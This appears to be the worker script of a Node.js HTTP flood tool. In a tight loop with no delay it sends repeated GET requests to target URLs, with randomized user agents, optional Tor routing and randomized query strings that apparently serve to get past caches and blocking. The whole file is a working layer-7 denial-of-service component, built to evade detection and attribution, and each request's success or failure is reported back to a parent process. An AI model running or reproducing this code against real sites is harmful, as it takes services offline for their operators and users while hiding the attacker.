const {
    parentPort, workerData
} =                     require('worker_threads');
const proxy =           require('tor-request');
const request =         require('request');
const randomUseragent = require('random-useragent');
const generateRandomQuery = require('./utils/randomQuery');

const { urls, tor, query } = workerData;


if (tor) {
    setInterval(() => {
        urls.forEach(url => {
            proxy.request({
                url     : query ? generateRandomQuery(url) : url,
                method  : 'GET',
                headers : {
                    'User-Agent' : randomUseragent.getRandom()
                }
            }, (err, res) => {
                if (err) return parentPort.postMessage({ url, success: 'unsuccessfully' });
                if (res?.statusCode && res?.statusCode < 400) return parentPort.postMessage({ url, success: 'successfully' });
            });
        });
    });
} else {
    setInterval(() => {
        urls.forEach(url => {
            request({
                url     : query ? generateRandomQuery(url) : url,
                method  : 'GET',
                headers : {
                    'User-Agent' : randomUseragent.getRandom()
                }
            }, (err, res) => {
                if (err) return parentPort.postMessage({ url, success: 'unsuccessfully' });
                if (res?.statusCode && res?.statusCode < 400) return parentPort.postMessage({ url, success: 'successfully' });
            });
        });
    });
}
